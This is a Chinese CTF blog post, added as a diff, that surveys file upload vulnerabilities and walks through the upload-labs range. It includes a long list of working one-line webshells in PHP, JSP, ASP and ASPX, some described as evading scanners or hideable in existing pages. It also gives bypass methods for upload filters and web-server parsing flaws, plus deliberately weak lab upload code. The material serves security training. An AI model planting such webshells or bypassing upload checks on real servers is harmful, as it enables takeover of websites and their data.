@@ -1,0 +1,2380 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="文件上传漏洞, OrigiN">
+    <meta name="description" content="文件上传漏洞 (上传知识点、题型总结大全-upload靶场全解)
+什么是文件上传漏洞文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>文件上传漏洞 | OrigiN</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">OrigiN</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">OrigiN</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">文件上传漏洞</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-03-26
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="文件上传漏洞-上传知识点、题型总结大全-upload靶场全解"><a href="#文件上传漏洞-上传知识点、题型总结大全-upload靶场全解" class="headerlink" title="文件上传漏洞 (上传知识点、题型总结大全-upload靶场全解)"></a>文件上传漏洞 (上传知识点、题型总结大全-upload靶场全解)</h1><hr>
+<h3 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h3><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>
+<hr>
+<hr>
+<h3 id="什么是webshell"><a href="#什么是webshell" class="headerlink" title="什么是webshell"></a>什么是webshell</h3><p>**WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。*<em>攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的*<em>（可以上传下载或者修改文件，操作数据库，执行任意命令等）。</em></em> <strong>WebShell后门隐蔽较性高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录</strong></p>
+<hr>
+<hr>
+<h3 id="一句话木马大全"><a href="#一句话木马大全" class="headerlink" title="一句话木马大全"></a>一句话木马大全</h3><p><strong>可跳过~~</strong><br>常用的webshell就是一句话木马，结合中国菜刀或者hackbar等工具可以很高效快捷的获得网站shell。</p>
+<pre><code>##PHP：
+&lt;?php @eval($_POST[&#39;r00ts&#39;]);?&gt; 
+&lt;?php phpinfo();?&gt;
+&lt;?php @eval($_POST[cmd]);?&gt;
+&lt;?php @eval($_REQUEST[cmd]);?&gt;
+&lt;?php assert($_REQUEST[cmd]); ?&gt;
+&lt;?php //?cmd=phpinfo() @preg_replace(&quot;/abc/e&quot;,$_REQUEST[&#39;cmd&#39;],&quot;abcd&quot;); ?&gt;
+&lt;?php 
+//?cmd=phpinfo();
+$func =create_function(&#39;&#39;,$_REQUEST[&#39;cmd&#39;]);
+$func();
+?&gt;
+
+&lt;?php
+//?func=system&amp;cmd=whoami
+$func=$_GET[&#39;func&#39;];
+$cmd=$_GET[&#39;cmd&#39;];
+$array[0]=$cmd;
+$new_array=array_map($func,$array);
+//print_r($new_array);
+?&gt;
+
+&lt;?php 
+//?cmd=phpinfo()
+@call_user_func(assert,$_GET[&#39;cmd&#39;]);
+?&gt;
+
+&lt;?php 
+//?cmd=phpinfo()
+$cmd=$_GET[&#39;cmd&#39;];
+$array[0]=$cmd;
+call_user_func_array(&quot;assert&quot;,$array);
+?&gt;
+
+&lt;?php 
+//?func=system&amp;cmd=whoami
+$cmd=$_GET[&#39;cmd&#39;];
+$array1=array($cmd);
+$func =$_GET[&#39;func&#39;];
+array_filter($array1,$func);
+?&gt;
+
+&lt;?php usort($_GET,&#39;asse&#39;.&#39;rt&#39;);?&gt; php环境&gt;=&lt;5.6才能用
+&lt;?php usort(...$_GET);?&gt;  php环境&gt;=5.6才能用
+&lt;?php eval($_POST1);?&gt; 
+&lt;?php if(isset($_POST[&#39;c&#39;]))&#123;eval($_POST[&#39;c&#39;]);&#125;?&gt; 
+&lt;?php system($_REQUEST1);?&gt; 
+&lt;?php ($_=@$_GET1).@$_($_POST1)?&gt; 
+&lt;?php eval_r($_POST1)?&gt; 
+&lt;?php @eval_r($_POST1)?&gt;//容错代码 
+&lt;?php assert($_POST1);?&gt;//使用Lanker一句话客户端的专家模式执行相关的PHP语句 
+&lt;?$_POST[&#39;c&#39;]($_POST[&#39;cc&#39;]);?&gt; 
+&lt;?$_POST[&#39;c&#39;]($_POST[&#39;cc&#39;],$_POST[&#39;cc&#39;])?&gt; 
+&lt;?php @preg_replace(&quot;/[email]/e&quot;,$_POST[&#39;h&#39;],&quot;error&quot;);?&gt;/*使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入*/:&lt;O&gt;h=@eval_r($_POST1);&lt;/O&gt; 
+&lt;?php echo `$_GET[&#39;r&#39;]` ?&gt; 
+
+&lt;script language=&quot;php&quot;&gt;@eval_r($_POST[sb])&lt;/script&gt; //绕过&lt;?限制的一句话
+
+&lt;?php (])?&gt;   上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！
+
+&lt;?if(isset($_POST[&#39;1&#39;]))&#123;eval($_POST[&#39;1&#39;]);&#125;?&gt;&lt;?php system ($_REQUEST[1]);?&gt; 
+加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！
+
+&lt;%execute request(“class”)%&gt;&lt;%&#39;&lt;% loop &lt;%:%&gt;&lt;%&#39;&lt;% loop &lt;%:%&gt;&lt;%execute request (“class”)%&gt;&lt;%execute request(“class”)&#39;&lt;% loop &lt;%:%&gt; 
+无防下载表，有防下载表可尝试插入以下语句突破的一句话 
+
+&lt;%eval(request(“1″)):response.end%&gt; 备份专用
+##JSP：
+&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt; 
+提交客户端 
+&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;textareaname=&quot;t&quot;&gt;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=&quot;submit&quot;value=&quot;提交&quot;&gt;&lt;/form&gt;
+
+
+##ASP
+&lt;%eval(Request.Item[&quot;r00ts&quot;],”unsafe”);%&gt;
+
+&lt;%IfRequest(“1″)&lt;&gt;”&quot;ThenExecuteGlobal(Request(“1″))%&gt; 
+
+&lt;%execute(request(“1″))%&gt; 
+
+&lt;scriptrunat=server&gt;execute request(“1″)&lt;/script&gt; 不用&#39;&lt;,&gt;‘的asp一句话 
+##aspx
+&lt;scriptrunat=”server”&gt;WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.y (“add6bb58e139be10″);&lt;/script&gt; 
+
+&lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt; 
+
+&lt;%eval request(chr(35))%&gt;  不用双引号的一句话。
+</code></pre>
+<hr>
+<hr>
+<h3 id="产生文件上传漏洞的原因"><a href="#产生文件上传漏洞的原因" class="headerlink" title="产生文件上传漏洞的原因"></a>产生文件上传漏洞的原因</h3><blockquote>
+<p><strong>原因：</strong></p>
+<ul>
+<li>对于上传文件的后缀名（扩展名）没有做较为严格的限制</li>
+<li>对于上传文件的MIMETYPE(用于描述文件的类型的一种表述方法) 没有做检查</li>
+<li>权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于shebang类型的文件）</li>
+<li>对于web server对于上传文件或者指定目录的行为没有做限制</li>
+</ul>
+</blockquote>
+<hr>
+<blockquote>
+<p><strong>原理：</strong><br>在 WEB 中进行文件上传的原理是通过将表单设为 multipart&#x2F;form-data，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段 (multipart) 的数据信息，并将其中的文件内容提取出来并保存的。通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名 ( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上</p>
+<p>文件上传后导致的常见安全问题一般有:</p>
+<ul>
+<li>上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本,导致代码执行;</li>
+<li>上传文件是Flash的策略文件crossdomain.xml,黑客用以控制Flash在该域下的行为(其<br>他通过类似方式控制策略文件的情况类似);</li>
+<li>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行:</li>
+<li>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执<br>行，被用于钓鱼和欺诈。</li>
+</ul>
+<p>除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口,溢出服务器的后台处理程序，如图片解析模块;或者上传-一个合法的文本文件， 其内容包含了PHP脚本，再通过“本地文件包含漏洞(Local File Include)”执行此脚本;等等。此类问题不在此细述。</p>
+</blockquote>
+<hr>
+<hr>
+<h3 id="文件上传漏洞的攻击与防御方式"><a href="#文件上传漏洞的攻击与防御方式" class="headerlink" title="文件上传漏洞的攻击与防御方式"></a>文件上传漏洞的攻击与防御方式</h3><h4 id="1-前端限制"><a href="#1-前端限制" class="headerlink" title="1.前端限制"></a>1.前端限制</h4><pre><code>&lt;li id=&quot;show_code&quot;&gt;
+    &lt;h3&gt;代码&lt;/h3&gt;
+&lt;pre&gt;
+&lt;code class=&quot;line-numbers language-javascript&quot;&gt;function checkFile() &#123;
+    var file = document.getElementsByName(&#39;upload_file&#39;)[0].value;
+    if (file == null || file == &quot;&quot;) &#123;
+        alert(&quot;请选择要上传的文件!&quot;);
+        return false;
+    &#125;
+    //定义允许上传的文件类型
+    var allow_ext = &quot;.jpg|.png|.gif&quot;;
+    //提取上传文件的类型
+    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));
+    //判断上传文件类型是否允许上传
+    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123;
+        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;
+        alert(errMsg);
+        return false;
+    &#125;
+&#125;
+&lt;/code&gt;
+&lt;/pre&gt;
+&lt;/li&gt;
+</code></pre>
+<p><strong>原理</strong></p>
+<p><strong>在表单中使用onsumbit&#x3D;checkFile()调用js函数来检查上传文件的扩展名。当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。</strong></p>
+<p><strong>绕过方法</strong></p>
+<p>这种限制很简单，通过浏览器F12很简单的修改文件后缀名就可以完成绕过检查，或者是讲木马修改后缀名后上传，通过改包工具修改上传。如果是JS脚本检测，在本地浏览器客户端禁用JS即可。可使用火狐浏览器的NoScript插件、IE中禁用掉JS等方式实现绕过。</p>
+<p><strong>操作方法</strong></p>
+<p>准备一句话木马：</p>
+<pre><code>&lt;?php
+@eval($_POST[&#39;cmd&#39;]);
+?&gt;
+</code></pre>
+<p>并且修改后缀名为jpg，上传操作，通过burpsuit抓包改包，使其后缀名修改回php。</p>
+<hr>
+<h4 id="2-检查扩展名"><a href="#2-检查扩展名" class="headerlink" title="2.检查扩展名"></a>2.检查扩展名</h4><p><strong>就是在文件被上传到服务端的时候，对于文件名的扩展名进行检查，如果不合法，则拒绝这次上传</strong><br>在检查扩展名是否合法的时候，有两种策略：</p>
+<h5 id="1-黑名单策略，"><a href="#1-黑名单策略，" class="headerlink" title="1.黑名单策略，"></a>1.黑名单策略，</h5><p>文件扩展名在黑名单中的为不合法<br><strong>示例</strong></p>
+<pre><code>//黑名单策略
+&lt;li id=&quot;show_code&quot;&gt;
+    &lt;h3&gt;代码&lt;/h3&gt;
+&lt;pre&gt;
+&lt;code class=&quot;line-numbers language-php&quot;&gt;$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists(UPLOAD_PATH)) &#123;
+        $deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);
+        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, &#39;.&#39;);
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //收尾去空
+
+        if(!in_array($file_ext, $deny_ext)) &#123;
+            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            
+            if (move_uploaded_file($temp_file,$img_path)) &#123;
+                 $is_upload = true;
+            &#125; else &#123;
+                $msg = &#39;上传出错！&#39;;
+            &#125;
+        &#125; else &#123;
+            $msg = &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;
+&lt;/code&gt;
+&lt;/pre&gt;
+&lt;/li&gt;
+</code></pre>
+<h5 id="2-白名单策略"><a href="#2-白名单策略" class="headerlink" title="2.白名单策略"></a>2.白名单策略</h5><p>文件扩展名不在白名单中的均为不合法<br><strong>示例</strong></p>
+<pre><code>&lt;li id=&quot;show_code&quot;&gt;
+    &lt;h3&gt;代码&lt;/h3&gt;
+&lt;pre&gt;
+&lt;code class=&quot;line-numbers language-php&quot;&gt;$is_upload = false;
+$msg = null;
+if(isset($_POST[&#39;submit&#39;]))&#123;
+    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
+    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);
+    if(in_array($file_ext,$ext_arr))&#123;
+        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+        $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+
+        if(move_uploaded_file($temp_file,$img_path))&#123;
+            $is_upload = true;
+        &#125; else &#123;
+            $msg = &#39;上传出错！&#39;;
+        &#125;
+    &#125; else&#123;
+        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+    &#125;
+&#125;
+&lt;/code&gt;
+&lt;/pre&gt;
+&lt;/li&gt;
+</code></pre>
+<p><strong>原理</strong><br><strong>当浏览器将文件提交到服务器端的时候，服务器端会根据设定的黑白名单对浏览器提交上来的文件扩展名进行检测，如果上传的文件扩展名不符合黑白名单的限制，则不予上传，否则上传成功。</strong></p>
+<p><strong>绕过方法</strong></p>
+<blockquote>
+<p>在一些Web server中，存在解析漏洞:<br><strong>1.老版本的IIS6中的目录解析漏洞，如果网站目录中有一个 &#x2F;.asp&#x2F;目录，那么此目录下面的一切内容都会被当作asp脚本来解析<br>2.老版本的IIS6中的分号漏洞：IIS在解析文件名的时候可能将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容来避免黑名单过滤，如 a.asp;jpg<br>3.旧版Windows Server中存在空格和dot漏洞类似于 a.php. 和 a.php[空格] 这样的文件名存储后会被windows去掉点和空格，从而使得加上这两个东西可以突破过滤，成功上传，并且被当作php代码来执行<br>4.nginx(0.5.x, 0.6.x, 0.7 &lt;&#x3D; 0.7.65, 0.8 &lt;&#x3D; 0.8.37)空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行（fastcgi会把这个文件当php看，不受空字节影响，但是检查文件后缀的那个功能会把空字节后面的东西抛弃，所以识别为jpg）<br>5.apache1.x,2.x的解析漏洞，上传如a.php.rar a.php.gif 类型的文件名，可以避免对于php文件的过滤机制，但是由于apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar等扩展名是apache不能识别的，因此就会直接将类型识别为php，从而达到了注入php代码的目的</strong></p>
+</blockquote>
+<hr>
+<h4 id="3-检查Content-Type"><a href="#3-检查Content-Type" class="headerlink" title="3.检查Content-Type"></a>3.检查Content-Type</h4><p><strong>原理</strong></p>
+<p>HTTP协议规定了上传资源的时候在Header中加上一项文件的MIMETYPE，来识别文件类型，这个动作是由浏览器完成的，服务端可以检查此类型不过这仍然是不安全的,因为HTTP header可以被发出者或者中间人任意的修改。</p>
+<p><strong>常见类型</strong></p>
+<table>
+<thead>
+<tr>
+<th>文件后缀</th>
+<th>Mime类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>.flv</td>
+<td>flv&#x2F;flv-flash</td>
+<td>在线播放</td>
+</tr>
+<tr>
+<td>.html或.htm</td>
+<td>text&#x2F;html</td>
+<td>超文本标记语言文本</td>
+</tr>
+<tr>
+<td>.rtf</td>
+<td>application&#x2F;rtf</td>
+<td>RTF文本</td>
+</tr>
+<tr>
+<td>.gif 或.png</td>
+<td>image&#x2F;gif(image&#x2F;png)</td>
+<td>GIF图形&#x2F;PNG图片</td>
+</tr>
+<tr>
+<td>.jpeg或.jpg</td>
+<td>image&#x2F;jpeg</td>
+<td>JPEG图形</td>
+</tr>
+<tr>
+<td>.au</td>
+<td>audio&#x2F;basic</td>
+<td>au声音文件</td>
+</tr>
+<tr>
+<td>.mid或.midi</td>
+<td>audio&#x2F;midi或audio&#x2F;x-midi</td>
+<td>MIDI音乐文件</td>
+</tr>
+<tr>
+<td>.ra或.ram或.rm</td>
+<td>audio&#x2F;x-pn-realaudio</td>
+<td>RealAudio音乐文件</td>
+</tr>
+<tr>
+<td>.mpg或.mpeg或.mp3</td>
+<td>video&#x2F;mpeg</td>
+<td>MPEG文件</td>
+</tr>
+<tr>
+<td>.avi</td>
+<td>video&#x2F;x-msvideo</td>
+<td>AVI文件</td>
+</tr>
+<tr>
+<td>.gz</td>
+<td>application&#x2F;x-gzip</td>
+<td>GZIP文件</td>
+</tr>
+<tr>
+<td>.tar</td>
+<td>application&#x2F;x-tar</td>
+<td>TAR文件</td>
+</tr>
+<tr>
+<td>.exe</td>
+<td>application&#x2F;octet-stream</td>
+<td>下载文件类型</td>
+</tr>
+<tr>
+<td>.rmvb</td>
+<td>video&#x2F;vnd.rn-realvideo</td>
+<td>在线播放</td>
+</tr>
+<tr>
+<td>.txt</td>
+<td>text&#x2F;plain</td>
+<td>普通文本</td>
+</tr>
+<tr>
+<td>.mrp</td>
+<td>application&#x2F;octet-stream</td>
+<td>MRP文件（国内普遍的手机）</td>
+</tr>
+<tr>
+<td>.ipa</td>
+<td>application&#x2F;iphone-package-archive</td>
+<td>IPA文件(IPHONE)</td>
+</tr>
+<tr>
+<td>.deb</td>
+<td>application&#x2F;x-debian-package-archive</td>
+<td>DED文件(IPHONE)</td>
+</tr>
+<tr>
+<td>.apk</td>
+<td>application&#x2F;vnd.android.package-archive</td>
+<td>APK文件(安卓系统)</td>
+</tr>
+<tr>
+<td>.cab</td>
+<td>application&#x2F;vnd.cab-com-archive</td>
+<td>CAB文件(Windows Mobile)</td>
+</tr>
+<tr>
+<td>.xap</td>
+<td>application&#x2F;x-silverlight-app</td>
+<td>XAP文件(Windows Phone 7)</td>
+</tr>
+<tr>
+<td>.sis</td>
+<td>application&#x2F;vnd.symbian.install-archive</td>
+<td>SIS文件(symbian平台)</td>
+</tr>
+<tr>
+<td>.jar</td>
+<td>application&#x2F;java-archive</td>
+<td>JAR文件(JAVA平台手机通用格式)</td>
+</tr>
+<tr>
+<td>.jad</td>
+<td>text&#x2F;vnd.sun.j2me.app-descriptor</td>
+<td>JAD文件(JAVA平台手机通用格式)</td>
+</tr>
+<tr>
+<td>.sisx</td>
+<td>application&#x2F;vnd.symbian.epoc&#x2F;x-sisx-app</td>
+<td>SISX文件(symbian平台)</td>
+</tr>
+</tbody></table>
+<p>显示详细信息</p>
+<p><strong>绕过方法</strong><br>使用各种各样的工具（如burpsuite）强行篡改Header就可以，将Content-Type: application&#x2F;php改为其他web程序允许的类型。</p>
+<hr>
+<h4 id="4-文件头检查文件"><a href="#4-文件头检查文件" class="headerlink" title="4.文件头检查文件"></a>4.文件头检查文件</h4><p><strong>原理</strong></p>
+<p><strong>利用的是每一个特定类型的文件都会有不太一样的开头或者标志位。</strong></p>
+<table>
+<thead>
+<tr>
+<th>格式</th>
+<th>文件头</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>TIFF (tif)</td>
+<td>49492A00</td>
+</tr>
+<tr>
+<td>Windows Bitmap (bmp)</td>
